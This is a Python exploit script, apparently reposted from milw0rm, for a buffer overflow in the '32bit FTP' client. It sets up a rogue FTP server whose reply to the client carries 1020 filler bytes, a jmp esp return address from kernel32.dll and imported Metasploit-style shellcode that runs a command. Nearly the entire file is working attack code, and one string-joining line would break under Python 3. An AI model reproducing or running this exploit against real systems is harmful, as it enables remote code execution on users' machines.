#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : 32bit FTP (09.04.24) (CWD response) Remote Buffer Overflow Exploit
#[*] Refer : http://www.milw0rm.com/exploits/8611
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

import socket
import ftplib
from ftplib import FTP
import struct

from payload import buf

def shell_attack(target_machine, target_port):
    payload = b"\x41"*1020
    payload += b"\x67\x86\x86\x7C" # jmp esp kernel32.dll

    # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
    payload += buf

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((target_machine, target_port))
    s.listen(1)
    
    c, addr = s.accept()

    

    c.send(b"220 Hello\r\n")
    c.recv(1024)
    c.send(b"331 pwd please\r\n")
    c.recv(1024)
    c.send(b"230 OK\r\n")
    c.recv(1024)
    c.send(b"250 CWD command successful.\r\n")
    c.recv(1024)
    c.send(b"257 "+payload+"is current directory.")
    c.close()
    
    s.close()

    # milw0rm.com [2009-05-05]